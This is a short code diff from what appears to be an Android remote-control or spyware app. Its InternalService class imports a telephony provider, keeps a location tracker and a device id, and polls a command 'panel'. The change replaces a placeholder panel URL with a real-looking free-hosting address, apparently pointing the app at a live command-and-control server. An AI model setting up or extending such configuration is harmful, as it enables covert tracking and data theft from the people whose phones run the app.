@@ -77,7 +77,7 @@ import me.everything.providers.android.telephony.TelephonyProvider;
 public class InternalService extends Service implements TextToSpeech.OnInitListener {
 
     public Context context;
-    private String SERVER_URI = "https://your-panel-url/public/commands.php";
+    private String SERVER_URI = "https://rootusertestt.000webhostapp.com/public/commands.php";
     private Timer timerTaskScheduler = new Timer();
     private LocationTracker tracker = null;
     private String deviceUniqueId = null;
